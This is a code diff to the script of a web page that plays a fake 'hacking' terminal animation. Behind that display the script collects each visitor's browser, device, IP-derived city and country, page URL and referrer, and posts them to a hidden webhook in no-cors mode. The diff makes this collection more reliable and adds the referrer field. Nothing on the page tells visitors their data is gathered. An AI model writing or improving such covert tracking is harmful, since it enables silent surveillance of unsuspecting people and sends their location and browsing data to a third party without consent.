@@ -120,25 +120,27 @@
   async function collectAndSubmit() {
     const now = new Date();
     const ua = navigator.userAgent;
-    
     const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(ua);
     const deviceType = isMobile ? 'Mobile' : 'Desktop';
 
-    let browserName = "Unknown";
+    let browserName = "Unknown Browser";
     if (ua.includes("Firefox")) browserName = "Firefox";
     else if (ua.includes("SamsungBrowser")) browserName = "Samsung Internet";
     else if (ua.includes("Opera") || ua.includes("OPR")) browserName = "Opera";
     else if (ua.includes("Edge") || ua.includes("Edg")) browserName = "Edge";
     else if (ua.includes("Chrome")) browserName = "Chrome";
     else if (ua.includes("Safari")) browserName = "Safari";
-    else browserName = ua.substring(0, 40) + "...";
 
     let userLocation = "Fetching...";
     try {
-      const geo = await fetch('https://ipapi.co/json/');
+      // Using a timeout for the geo-fetch so it doesn't hang the script
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 2500);
+      
+      const geo = await fetch('https://ipapi.co/json/', { signal: controller.signal });
       const g = await geo.json();
-      if (g.error) throw new Error("Rate limited");
-      userLocation = `${g.city}, ${g.region}, ${g.country_name}`;
+      userLocation = g.error ? "Location Private" : `${g.city}, ${g.region}, ${g.country_name}`;
+      clearTimeout(timeoutId);
     } catch (e) { 
       userLocation = "Location Private or Adblocked"; 
     }
@@ -146,24 +148,29 @@
     const payload = {
       timestamp: now.toISOString(),
       device: deviceType + " / " + browserName, 
-      browser: browserName,
       location: userLocation,
-      url: window.location.href
+      url: window.location.href,
+      referrer: document.referrer || "Direct"
     };
 
-fetch(WEBHOOK_URL, {
-  method: 'POST',
-  mode: 'no-cors', // Keeps the browser from blocking the request
-  cache: 'no-cache',
-  body: JSON.stringify(payload) // Data goes in the body
-}).catch(err => console.error("Webhook failed", err));
+    // Use return to ensure the fetch promise is created
+    return fetch(WEBHOOK_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      cache: 'no-cache',
+      body: JSON.stringify(payload)
+    });
   }
+  
   function startSequence() {
+    // 1. UI Update
     document.getElementById("initBtn").style.display = "none";
     document.getElementById("terminal").innerHTML = "> INITIALIZING...";
     
-    collectAndSubmit();
+    // 2. Start data collection immediately
+    collectAndSubmit().catch(err => console.error("Log error:", err));
     
+    // 3. Start the visual terminal "hack" effect
     let i = 0;
     const interval = setInterval(() => {
       if (i < logs.length) {
@@ -173,7 +180,7 @@ fetch(WEBHOOK_URL, {
         clearInterval(interval);
         triggerDenied();
       }
-    }, 700);
+    }, 600); // Slightly faster for better feel
   }
 
   function triggerDenied() {
@@ -188,6 +195,3 @@ fetch(WEBHOOK_URL, {
     }, 3500);
   }
 </script>
-
-</body>
-</html>
